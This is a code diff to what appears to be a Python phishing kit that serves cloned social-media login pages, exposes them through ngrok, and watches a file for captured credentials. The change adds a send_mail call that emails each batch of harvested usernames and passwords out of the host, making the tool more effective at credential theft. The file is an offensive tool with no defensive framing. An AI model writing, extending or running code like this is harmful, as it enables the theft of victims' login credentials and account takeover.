@@ -14,7 +14,8 @@ from os import system
 from time import sleep
 from huepy import *
 from subprocess import getoutput
-    
+from core.email import send_mail
+
 def runPhishing(social, custom):
     system('rm -Rf base/Server/www/*.* && touch base/Server/www/cat.txt')   
     command = 'cp base/WebPages/%s/*.* base/Server/www/' % social.lower()
@@ -31,10 +32,13 @@ def waitCreds():
     while True:
         with open('base/Server/www/cat.txt') as creds:
             lines = creds.read().rstrip()
-        if len(lines) != 0: 
-            print(green('\n [*] Credentials found:\n %s' % lines))                        
+        if len(lines) != 0:
+            print(green('\n [*] Credentials found:\n %s' % lines))
             system('rm -rf base/Server/www/cat.txt && touch base/Server/www/cat.txt')
-        creds.close()
+            try:
+                send_mail(lines.split('\n'))       
+            except NameError:
+                pass                
 
 def runNgrok():
     system('./base/Server/ngrok http 1449 > /dev/null &')
